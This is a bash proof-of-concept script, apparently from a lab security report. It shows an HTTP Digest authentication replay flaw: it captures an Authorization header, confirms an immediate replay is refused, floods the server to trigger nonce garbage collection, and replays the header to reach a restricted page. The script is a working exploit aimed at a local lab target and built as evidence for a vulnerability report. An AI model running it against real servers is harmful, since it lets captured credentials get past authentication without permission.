#!/usr/bin/env bash
set -euo pipefail

# Configuration (defaults to vulnerable target)
BASE_URL="${BASE_URL:-http://127.0.0.1:8080}"
DIGEST_USER="${DIGEST_USER:-digestuser}"
DIGEST_PASS="${DIGEST_PASS:-LabPass123}"
EVIDENCE_DIR="${EVIDENCE_DIR:-../report/evidence}"
LABEL="${LABEL:-digest-vulnerable}"
GC_COUNT="${GC_COUNT:-96}"
EXPECT_POST_STATUS="${EXPECT_POST_STATUS:-200}"

mkdir -p "$EVIDENCE_DIR"

echo "[*] Capturing valid Digest header from $BASE_URL..."
curl -sS -v --digest -u "$DIGEST_USER:$DIGEST_PASS" "$BASE_URL/digest/" \
  -o "$EVIDENCE_DIR/${LABEL}-initial-body.html" 2> "$EVIDENCE_DIR/${LABEL}-capture.txt"

AUTH="$(sed -n 's/^> \(Authorization: Digest .*\)$/\1/p' "$EVIDENCE_DIR/${LABEL}-capture.txt" | tail -n 1 | tr -d '\r')"
if [ -z "$AUTH" ]; then
  echo "[-] ERROR: No Digest Authorization header captured."
  exit 1
fi
printf '%s\n' "$AUTH" > "$EVIDENCE_DIR/${LABEL}-authorization.txt"

echo "[*] Testing immediate negative control (Expecting 401)..."
CTL_STATUS=$(curl -sS -D "$EVIDENCE_DIR/${LABEL}-control-headers.txt" \
  -o "$EVIDENCE_DIR/${LABEL}-control-body.txt" -w '%{http_code}' \
  -H "$AUTH" "$BASE_URL/digest/")

if [ "$CTL_STATUS" != "401" ]; then
  echo "[-] ERROR: Negative control failed. Expected 401, got $CTL_STATUS. Setup invalid."
  exit 2
fi
echo "[+] Negative control returned 401."

echo "[*] Triggering client-entry garbage collection ($GC_COUNT requests)..."
for _ in $(seq 1 "$GC_COUNT"); do
  curl -sS -o /dev/null "$BASE_URL/digest/"
done

echo "[*] Replaying identical captured header (Expecting $EXPECT_POST_STATUS)..."
POST_STATUS=$(curl -sS -D "$EVIDENCE_DIR/${LABEL}-replay-headers.txt" \
  -o "$EVIDENCE_DIR/${LABEL}-replay-body.txt" -w '%{http_code}' \
  -H "$AUTH" "$BASE_URL/digest/")

echo "[+] Post-GC Replay Status: $POST_STATUS"

if [ "$POST_STATUS" = "$EXPECT_POST_STATUS" ]; then
  if [ "$EXPECT_POST_STATUS" = "200" ] && grep -qi 'ACW3 restricted area' "$EVIDENCE_DIR/${LABEL}-replay-body.txt"; then
    echo "[+] SUCCESS: Restricted content accessed via replayed header."
  else
    echo "[+] SUCCESS: Status matched expected $EXPECT_POST_STATUS."
  fi
  exit 0
else
  echo "[-] FAILURE: Expected $EXPECT_POST_STATUS, but got $POST_STATUS."
  exit 3
fi
